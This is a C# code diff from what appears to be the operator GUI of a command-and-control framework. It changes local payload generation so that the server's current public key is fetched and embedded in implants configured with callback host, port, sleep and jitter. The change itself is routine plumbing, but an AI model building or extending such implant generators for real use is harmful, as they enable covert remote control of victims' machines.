@@ -4157,7 +4157,8 @@ namespace CsdevGui
             // 解密模板 + 覆写配置槽, 完全不走服务端、也不需要 gcc / PowerShell。
             if (NativeGenerator.Supports(fmt))
             {
-                return GenerateNativeLocally(fmt, host, port, ssl, outFile, sleep, jitter, password);
+                byte[] pubkey = await FetchServerPubkeyAsync();
+                return GenerateNativeLocally(fmt, host, port, ssl, outFile, sleep, jitter, password, pubkey);
             }
 
             // 请求体由 PayloadRequest.Build 构造 (纯函数, 字段名/省略规则有自测钉住)
@@ -4267,15 +4268,42 @@ namespace CsdevGui
         }
 
         /// <summary>
+        /// 拉取服务端当前公钥 (GET /api/pubkey), 用于覆写进本地生成载荷的配置槽。
+        /// 失败/离线时返回 null —— 生成器会回退到模板编译期公钥。
+        /// </summary>
+        private async Task<byte[]> FetchServerPubkeyAsync()
+        {
+            try
+            {
+                using (var doc = await _api.GetPubkeyAsync())
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok"))
+                    {
+                        string b64 = root.Str("blob_b64");
+                        if (!string.IsNullOrEmpty(b64)) return Convert.FromBase64String(b64);
+                    }
+                }
+            }
+            catch { }
+            return null;
+        }
+
+        /// <summary>
         /// 客户端本地生成原生格式载荷: 解密内嵌模板 + 覆写配置槽, 产出字节直接落盘到本机。
         ///
         /// 与旧的服务端回传流程对等的三件事: 写日志(口令脱敏)、把 data 落到本机保存路径、
         /// 更新状态栏。差别只有一点 —— 这里没有任何网络往返, 也不依赖服务端是否装 gcc。
         /// </summary>
         private bool GenerateNativeLocally(string fmt, string host, long port, bool ssl,
-                                           string outFile, long sleep, long jitter, string password)
+                                           string outFile, long sleep, long jitter, string password,
+                                           byte[] pubkey)
         {
-            var res = NativeGenerator.Generate(fmt, host, (int)port, ssl, "", (int)sleep, (int)jitter, "raw", password);
+            var res = NativeGenerator.Generate(fmt, host, (int)port, ssl, "", (int)sleep, (int)jitter, "raw", password, pubkey);
+
+            GenLine(pubkey != null
+                ? "    [公钥] 已用服务端当前公钥 (与 data/csdev.key 同源)"
+                : "    [公钥] 未取到服务端公钥, 回退模板编译期公钥 (若回连失败请检查服务端连接)");
 
             string shown = MaskPwd(res.Log ?? "", password);
             if (!string.IsNullOrEmpty(shown))
